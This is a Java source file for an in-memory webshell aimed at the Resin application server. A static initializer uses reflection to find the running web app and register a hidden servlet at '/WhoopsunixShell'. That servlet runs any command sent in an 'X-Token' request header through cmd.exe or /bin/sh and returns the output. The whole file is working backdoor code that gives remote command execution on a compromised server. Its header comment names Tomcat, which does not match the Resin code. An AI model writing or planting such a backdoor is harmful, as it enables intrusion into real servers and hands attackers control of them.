package org.example.resin.memshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * @author Whoopsunix
 * JMX 获取 StandardContext 注入 Tomcat Servlet 型内存马
 * Tomcat 7 8 9
 */
public class ResinServletExecMS implements Servlet {
    private static String NAME = "Whoopsunix";
    private static String PATTERN = "/WhoopsunixShell";
    private static String HEADER = "X-Token";

    static {
        try {
            ResinServletExecMS resinServletExecMS = new ResinServletExecMS();

            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
            for (int i = 0; i < threads.length; i++) {
                try {
                    Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                    Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
                    Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
                    if (webapp == null){
                        continue;
                    }

                    if (isInject(webapp, resinServletExecMS)) {
                        break;
                    }

                    inject(webapp, resinServletExecMS);
                } catch (Exception e) {}
            }
        } catch (Exception e) {
        }
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String cmd = httpServletRequest.getHeader(HEADER);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println(result);
        } catch (Exception e) {

        }
    }

    public static void inject(Object webapp, Object object) {
        try {
            String NAME = (String) getFieldValue(object, "NAME");
            String pattern = (String) getFieldValue(object, "PATTERN");
            Object servletMapping = Class.forName("com.caucho.server.dispatch.ServletMapping").newInstance();
            invokeMethod(servletMapping, "setServletClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
            invokeMethod(servletMapping, "setServletName", new Class[]{String.class}, new Object[]{NAME});
            invokeMethod(servletMapping, "addURLPattern", new Class[]{String.class}, new Object[]{pattern});
            invokeMethod(webapp, "addServletMapping", new Class[]{Class.forName("com.caucho.server.dispatch.ServletMapping")}, new Object[]{servletMapping});

//            Object servletConfigImpl = Class.forName("com.caucho.server.dispatch.ServletConfigImpl").newInstance();
//            invokeMethod(servletConfigImpl, "setServletName", new Class[]{String.class}, new Object[]{NAME});
//            invokeMethod(servletConfigImpl, "setServletClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
//            invokeMethod(servletConfigImpl, "setServletClass", new Class[]{Class.forName("java.lang.Class")}, new Object[]{object.getClass()});
//            invokeMethod(servletConfigImpl, "setServlet", new Class[]{Class.forName("javax.servlet.Servlet")}, new Object[]{object});
//            webapp.getClass().getDeclaredMethod("addServlet", Class.forName("com.caucho.server.dispatch.ServletConfigImpl")).invoke(webapp, servletConfigImpl);


        } catch (Exception e) {
            
        }
    }

    public static boolean isInject(Object webapp, Object object) {
        try {
            String name = (String) getFieldValue(object, "NAME");
            Object _servletManager = getFieldValue(webapp, "_servletManager");
            HashMap _servlets = (HashMap) getFieldValue(_servletManager, "_servlets");
            if (_servlets.containsKey(name)) {
                return true;
            }
        } catch (Exception e) {

        }
        return false;
    }


    public ResinServletExecMS() {

    }

    public void init(ServletConfig servletConfig) throws ServletException {

    }

    public ServletConfig getServletConfig() {
        return null;
    }


    public String getServletInfo() {
        return null;
    }


    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) {
        try {
            Method method;
            try {
                method = obj.getClass().getDeclaredMethod(methodName, argsClass);
            } catch (NoSuchMethodException e) {
                method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
            }
            method.setAccessible(true);
            method.invoke(obj, args);
        } catch (Exception e) {
            
        }
    }
}
